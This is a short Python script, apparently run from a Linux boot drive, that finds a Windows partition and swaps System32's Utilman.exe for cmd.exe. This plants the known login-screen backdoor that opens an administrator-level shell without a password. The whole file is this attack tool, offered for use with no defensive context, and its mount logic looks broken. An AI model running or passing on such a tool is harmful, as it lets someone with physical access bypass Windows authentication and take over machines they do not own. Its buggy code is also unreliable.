#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import os

os.system('lsblk > result.txt')
os.system('mkdir /media/Windows')


def parse(file_name):
    result = []
    with open(file_name) as input_file:
        for line in input_file:
            temp_arr = line.split(' ')
            for item in temp_arr:
                if '└─' in item or '├─' in item:
                    result.append(item.replace('└─', '').replace('├─', ''))
    return result


def look_for_windows(list):
    for drive in drives_list:
        os.system('mount /dev/%s' % (drive))
        print('Checking for Windows on '+drive+'...\n')
        if os.path.isdir('/media/Windows/Windows'):
            print('Found Windows in '+drive+' and mounted it at /media/Windows')
            return drive
    return False


drives_list = parse("result.txt")
if look_for_windows(drives_list):
    os.system(
        'mv /media/Windows/Windows/System32/Utilman.exe /media/Windows/Windows/System32/Utilman.bak')
    os.system(
        'mv /media/Windows/Windows/System32/cmd.exe /media/Windows/Windows/System32/Utilman.exe')
    print('cmd.exe modified. Rebooting now')
else:
    print('no windows found on this machine, don\'t forget to take out the flash drive')

os.system('shutdown')
